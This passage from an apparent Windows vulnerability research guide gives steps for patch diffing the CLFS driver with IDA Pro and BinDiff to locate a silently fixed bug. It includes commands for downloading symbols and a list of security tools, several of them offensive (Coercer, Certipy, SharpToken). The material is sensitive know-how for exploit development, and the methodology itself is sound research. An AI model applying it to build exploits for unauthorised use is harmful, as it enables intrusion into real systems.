1. Load clfs_pre.sys in IDA Pro → auto-analyze → save clfs_pre.idb
2. Load clfs_post.sys in IDA Pro → auto-analyze → save clfs_post.idb
3. Open clfs_post.idb → Plugins → BinDiff → Diff Database → select clfs_pre.idb
4. Sort diff results by similarity ascending → review functions with <0.90 similarity
5. For each changed function: open side-by-side decompiled view
6. Identify removed/added bounds check, condition, or sanitization → this is the vulnerability
```

**Step 4 — Symbol resolution:**
```bash
# Download matching PDB for both binaries
pdb-downloader.exe C:\Diff\clfs_pre.sys --output C:\Symbols\
pdb-downloader.exe C:\Diff\clfs_post.sys --output C:\Symbols\

# Point IDA to symbol path before loading
# Options → General → Directories → Symbol Path → C:\Symbols\
```

---

## References

[R-1] sandbox-attacksurface-analysis-tools — https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools

[R-2] PrivescCheck — https://github.com/itm4n/PrivescCheck

[R-3] HEVD — https://github.com/hacksysteam/HackSysExtremeVulnerableDriver

[R-4] Sysinternals Suite — https://learn.microsoft.com/en-us/sysinternals/

[R-5] System Informer (Process Hacker 3) — https://systeminformer.sourceforge.io/

[R-6] impacket — https://github.com/fortra/impacket

[R-7] Jackalope fuzzer — https://github.com/googleprojectzero/jackalope

[R-8] WTF (What The Fuzz) — https://github.com/0vercl0k/wtf

[R-9] RpcView — https://github.com/silverf0x/RpcView

[R-10] BloodHound — https://github.com/BloodHoundAD/BloodHound

[R-11] Certipy — https://github.com/ly4k/Certipy

[R-12] Coercer — https://github.com/p0dalirius/Coercer

[R-13] SharpToken — https://github.com/BeichenDream/SharpToken

[R-14] Sealighter-TI — https://github.com/pathtofile/Sealighter

[R-15] BinDiff — https://www.zynamics.com/bindiff.html

[R-16] Diaphora — https://github.com/joxeankoret/diaphora

[R-17] Winbindex — https://winbindex.m417z.com/
